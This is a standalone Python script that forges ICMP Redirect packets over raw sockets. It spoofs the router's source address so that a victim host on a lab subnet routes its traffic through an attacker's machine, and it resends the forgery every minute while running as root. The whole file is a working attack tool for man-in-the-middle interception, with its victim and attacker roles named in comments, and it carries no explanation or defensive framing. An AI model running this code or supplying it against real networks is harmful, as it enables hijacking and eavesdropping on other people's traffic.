import socket
import struct
import sys
import os
import time

def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def build_ip_header(src_ip, dst_ip, payload_len):
    ver_ihl = (4 << 4) + 5  # Version + IHL
    tos = 0
    total_length = 20 + payload_len
    packet_id = 54321
    frag_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_ICMP
    checksum_ip = 0
    src_addr = socket.inet_aton(src_ip)
    dst_addr = socket.inet_aton(dst_ip)

    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl, tos, total_length, packet_id, frag_offset, ttl,
        protocol, checksum_ip, src_addr, dst_addr
    )

    ip_chksum = checksum(ip_header)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl, tos, total_length, packet_id, frag_offset, ttl,
        protocol, ip_chksum, src_addr, dst_addr
    )

    return ip_header

def build_icmp_redirect(orig_ip_header, orig_payload, redirect_to_ip):
    icmp_type = 5
    icmp_code = 1  # Host redirect
    placeholder_cksum = 0
    gateway = socket.inet_aton(redirect_to_ip)

    icmp_header = struct.pack("!BBH4s", icmp_type, icmp_code, placeholder_cksum, gateway)
    icmp_data = orig_ip_header + orig_payload[:8]
    chksum = checksum(icmp_header + icmp_data)

    icmp_packet = struct.pack("!BBH4s", icmp_type, icmp_code, chksum, gateway) + icmp_data
    return icmp_packet

def send_icmp_redirect(victim_ip, spoofed_router_ip, redirect_to_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    fake_ip_header = build_ip_header(victim_ip, "8.8.8.8", 0)
    fake_payload = b'\x00' * 8  # Dummy original payload

    icmp_packet = build_icmp_redirect(fake_ip_header, fake_payload, redirect_to_ip)
    outer_ip_header = build_ip_header(spoofed_router_ip, victim_ip, len(icmp_packet))
    full_packet = outer_ip_header + icmp_packet

    s.sendto(full_packet, (victim_ip, 0))
    print(f"[+] ICMP Redirect sent to {victim_ip}, redirecting traffic to {redirect_to_ip}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run this script as root!")
        sys.exit(1)

    # Example values — replace with your setup
    victim_ip = "192.168.56.20"
    spoofed_router_ip = "192.168.56.1"
    redirect_to_ip = "192.168.56.10"  # Attacker pretending to be the router
    
    while True:
        send_icmp_redirect(victim_ip, spoofed_router_ip, redirect_to_ip)
        time.sleep(60)